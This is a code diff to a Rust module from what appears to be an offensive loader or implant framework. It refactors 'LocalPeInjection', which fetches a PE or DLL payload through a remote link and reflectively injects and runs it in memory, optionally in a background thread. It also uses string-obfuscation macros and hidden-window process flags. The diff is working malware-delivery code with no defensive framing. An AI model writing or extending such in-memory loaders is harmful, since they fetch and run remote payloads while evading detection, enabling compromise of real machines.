@@ -27,8 +27,6 @@ use std::os::windows::process::CommandExt;
 #[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-
-
 use anyhow::Result;
 use serde::{Deserialize, Serialize};
 use std::fs::File;
@@ -471,32 +469,17 @@ impl ReflectivePEFromMemory {
     }
 }
 
-
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub enum CommandLine {
     ArgParse(),
     Txt(String),
 }
 
-/* 
-#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
-pub enum PeType {
-    Dll(String),
-    Exe(),
-}
-*/
-
-#[cfg(target_os = "windows")]
-use std::env;
 #[cfg(target_os = "windows")]
 use crate::local_pe_injection::main::local_pe_injection;
-//#[cfg(target_os = "windows")]
-//use crate::local_pe_injection::cmd::Args;
+#[cfg(target_os = "windows")]
+use std::env;
 
-
-//info!("DEBUG local_pe_injection");
-//use crate::local_pe_injection;
-//local_pe_injection();
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct LocalPeInjection {
     pub link: Link,
@@ -507,27 +490,41 @@ pub struct LocalPeInjection {
 }
 impl LocalPeInjection {
     #[cfg(target_os = "linux")]
-    pub fn exec_local_pe_injection(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+    pub fn exec_local_pe_injection(
+        &self,
+        _config: &Config,
+    ) -> Result<PayloadExecThread, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("LocalPeInjection")));
         return Ok(PayloadExecThread::NoThread());
     }
 
     #[cfg(target_os = "windows")]
-    pub fn exec_local_pe_injection(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
-        //let parsed_args = Wstunnel::parse_from(args);
-        // TODO args soit depuis CommandLine
-        //let args = Args::parse();Args
-        let args: Vec<String> = env::args().collect();
-        let args_ok: String = args.join(" ");
-
-        //
-        /*
-        let export = match self.pe_type.clone() {
-            PeType::Exe() => String::new(),
-            PeType::Dll(s) => s,
-        };*/
+    pub fn exec_local_pe_injection(
+        &self,
+        config: &Config,
+    ) -> Result<PayloadExecThread, anyhow::Error> {
+        let args_ok: String = match self.commandline.clone() {
+            CommandLine::ArgParse() => {
+                let args: Vec<String> = env::args().collect();
+                args.join(" ")
+            }
+            CommandLine::Txt(commandline) => commandline,
+        };
         let data: Vec<u8> = self.link.fetch_data(config)?;
-        local_pe_injection(args_ok,self.dll_entrypoint.clone(),data);
-        return Ok(PayloadExecThread::NoThread());
+
+        if self.thread {
+            let thread_dll_entrypoint = self.dll_entrypoint.clone();
+            let args_ok_commandline = args_ok.clone();
+            let thread = thread::spawn(move || {
+                let _ = local_pe_injection(args_ok_commandline, thread_dll_entrypoint, data);
+            });
+            return Ok(PayloadExecThread::Thread(
+                thread,
+                Payload::LocalPeInjection(self.clone()),
+            ));
+        } else {
+            let _ = local_pe_injection(args_ok, self.dll_entrypoint.clone(), data);
+            return Ok(PayloadExecThread::NoThread());
+        }
     }
 }
